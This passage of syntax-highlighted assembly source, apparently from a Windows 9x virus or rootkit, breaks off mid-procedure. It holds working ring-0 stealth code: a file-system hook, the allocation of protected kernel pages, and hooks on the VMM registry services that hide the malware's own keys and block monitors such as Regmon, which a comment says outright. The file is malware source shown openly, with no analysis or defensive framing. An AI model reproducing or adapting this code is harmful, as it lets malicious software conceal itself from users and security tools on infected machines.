</span><span class="sc5">IFSApiHook_hook</span><span class="sc4">:</span><span class="sc0">    
</span><span class="sc1">;           db  0beh                    ; uncoment this if u want to use this shit somehow..</span><span class="sc0">
</span><span class="sc1">;_origifshook       dd  ?                   </span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; no hook 4u, mister file-wanna-monitor</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">Ring0_FileIO_hook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0beh</span><span class="sc0">
</span><span class="sc5">_orig_Ring0_FileIO</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">_r0ifshookdlta</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_IFSr0HOOK</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">_r0ifshookdlta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">
            
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__done_cmp</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_this_name</span><span class="sc0"> </span><span class="sc5">_IFSr0HOOK</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__this_length</span><span class="sc0"> </span><span class="sc5">_IFSr0HOOK</span><span class="sc0">
</span><span class="sc5">__do_cmp</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__done_cmp</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">loopz</span><span class="sc0">   </span><span class="sc5">__do_cmp</span><span class="sc0">

            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc1">; stealth? either an ifs driver file corruption occured on my haed drive, or non of those r3 file interfaces r</span><span class="sc0">
</span><span class="sc1">; connected with this... atm, i have no fuckin desire to investigate this further. r0 on w9x sucks!!!</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
            
</span><span class="sc5">__done_cmp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
            

</span><span class="sc5">ifs_flag</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ifs_first_run</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">sys_handler</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_this_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">__this_length</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">stealthsplore_size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">stealthsplore_start</span><span class="sc0">

</span><span class="sc5">stealth_thread2</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">stealth_thread</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">stealthdlta</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_STLTH</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">stealthdlta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__ring0_code</span><span class="sc0"> </span><span class="sc5">_STLTH</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_in_ring0</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">__ring0_code</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pusha</span><span class="sc0">
            
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0">       </span><span class="sc1">; flags</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; *PhysAddr</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; maxPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; minPhys</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; AlignMask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; handle of VM (==0 if PG_SYS)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PG_SYS</span><span class="sc0">                  </span><span class="sc1">; pType</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">stealthcode_size</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">      </span><span class="sc1">; nPages</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageAllocate</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; eax = mem handle</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PC_STATIC</span><span class="sc0">                       </span><span class="sc1">; OR_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">PC_WRITEABLE</span><span class="sc4">+</span><span class="sc5">PC_USER</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; AND_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">stealthcode_size</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageModifyPermissions</span><span class="sc0">           </span><span class="sc1">; make pages inaccessible from ring3</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; copy some stealthcode</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stealthcode_start</span><span class="sc0"> </span><span class="sc5">_STLTH</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stealthcode_size</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Get_DDB</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">  
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">service_ptr_table</span><span class="sc4">-</span><span class="sc5">stealthcode_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc5">HOOK_SERVICE</span><span class="sc0">    </span><span class="sc5">_RegEnumKey</span><span class="sc0">
            </span><span class="sc5">HOOK_SERVICE</span><span class="sc0">    </span><span class="sc5">_RegOpenKey</span><span class="sc0">
            </span><span class="sc5">HOOK_SERVICE</span><span class="sc0">    </span><span class="sc5">_RegCreateKey</span><span class="sc0">
            </span><span class="sc5">HOOK_SERVICE</span><span class="sc0">    </span><span class="sc5">_RegDeleteKey</span><span class="sc0">
            </span><span class="sc5">HOOK_SERVICE</span><span class="sc0">    </span><span class="sc5">Hook_DS</span><span class="sc0">             </span><span class="sc1">; bye bye regmon... :)</span><span class="sc0">
            </span><span class="sc5">NUMBA_HOOKED_SERVICES</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
            
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc5">r0__err</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">stealthcode_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">hook_RegEnumKey</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">hKey</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">iSubKey</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">lpszName</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">cchName</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DDB_regenarate</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">cchName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lpszName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">iSubKey</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">hKey</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">real_RegEnumKey</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpszName</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__1</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"oivE"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"snIn"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_NO_MORE_ITEMS</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">hook_RegEnumKey</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">hook_RegOpenKey</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">phkResult</span><span class="sc0">
            
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DDB_regenarate</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__open_key</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"llat"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__open_key</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"snIn"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__open_key</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_BADKEY</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">
                        
</span><span class="sc5">__open_key</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">phkResult</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">hkey</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">real_RegOpenKey</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">hook_RegOpenKey</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">hook_RegCreateKey</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">phkResult</span><span class="sc0">
            
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DDB_regenarate</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__create_key</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"llat"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__create_key</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"snIn"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__create_key</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_BADKEY</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">
                        
</span><span class="sc5">__create_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">phkResult</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">hkey</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">real_RegCreateKey</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">hook_RegCreateKey</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">hook_RegDeleteKey</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">hKey</span><span class="sc0">
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">lpszSubKey</span><span class="sc0">
            
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DDB_regenarate</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__del_key</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"llat"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__del_key</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"snIn"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__del_key</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_FILE_NOT_FOUND</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__del_key</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lpszSubKey</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">hKey</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">real_RegDeleteKey</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">hook_RegDeleteKey</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">hookHook_DS</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
            
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DDB_regenarate</span><span class="sc0">

            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_RegOpenKey</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__check_hook</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_RegSetValueEx</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__ok_hook</span><span class="sc0">
</span><span class="sc5">__bad_hook</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">stc</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__check_hook</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Hook_Device_Service</span><span class="sc0">
